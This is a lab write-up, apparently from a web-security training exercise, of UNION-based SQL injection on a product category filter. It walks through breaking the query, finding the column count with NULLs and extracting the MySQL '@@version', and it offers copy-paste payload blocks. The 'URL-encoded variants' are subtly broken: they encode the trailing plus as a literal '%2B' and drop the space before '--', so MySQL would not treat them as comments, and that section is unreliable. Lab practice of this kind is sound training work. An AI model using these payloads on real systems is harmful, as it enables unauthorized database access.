# SQL Injection – MySQL Version Enumeration (UNION-based)

A concise write-up using **my original steps** (verbatim) with small, accurate notes and payload blocks.

---

## 🥅 Goal
**Query the MySQL database version** using `@@version` via a UNION-based injection.

---

## ✅ My Exact Steps (Verbatim)

1. **GOAL: query db version from mysql server.**

2. **Find vuln param: `/filter?category=Corporate+gifts'`**

3. **fix: `/filter?category=Corporate+gifts'+--+`**

4. **Add union to combine queries: `'+UNION+SELECT+NULL+--+` -> getting 500 status**

5. **adding column: `'+UNION+SELECT+NULL,NULL+--+` -> getting 200**

6. **we have reflection, lets try extracting the version: `'+UNION+SELECT+@@version,NULL+--+`**

7. **Lab solved!**

---

## 🧠 Minimal Additions (Why This Works)

- **UNION rules:** The injected `UNION SELECT` must match the **number of columns** (and ideally compatible types) from the original query.  
  - Step 4 (**1 column**) ⇒ **500 error** → mismatch.  
  - Step 5 (**2 columns**) ⇒ **200 OK** → column count now matches.
- **Choosing `NULL`:** `NULL` is type-flexible and helps avoid type errors during column discovery.
- **MySQL version source:** `@@version` returns the server version string in MySQL - Found by GOOGLE search (See picture).
- **Commenting remainder:** In MySQL, `--` starts a comment **if followed by a whitespace** (space, newline, etc.). Using `--+` ensures a trailing space (since `+` decodes as space). Alternatives: `#` (comment to EOL) or `/* ... */`.
- **URL encoding:** `+` is typically treated as a space in query strings. Where precision matters, use `%20` for an explicit space.

---

## 🔧 Payloads I Used (Copy/Paste)

**As entered (human-readable with `+` for spaces):**
```txt
/filter?category=Corporate+gifts'
/filter?category=Corporate+gifts'+--+
/filter?category=Corporate+gifts'+UNION+SELECT+NULL+--+
/filter?category=Corporate+gifts'+UNION+SELECT+NULL,NULL+--+
/filter?category=Corporate+gifts'+UNION+SELECT+@@version,NULL+--+
```

**URL-encoded variants (safe in raw requests):**
```txt
/filter?category=Corporate%20gifts%27
/filter?category=Corporate%20gifts%27--%2B
/filter?category=Corporate%20gifts%27%20UNION%20SELECT%20NULL--%2B
/filter?category=Corporate%20gifts%27%20UNION%20SELECT%20NULL%2CNULL--%2B
/filter?category=Corporate%20gifts%27%20UNION%20SELECT%20%40%40version%2CNULL--%2B
```

> Tip: If the app renders the **second column** on the page, swap positions (e.g., `NULL,@@version`).

---

## 🏁 Result
- The endpoint reflects `@@version`, revealing the **MySQL server version**. **Lab Solved. ✅**
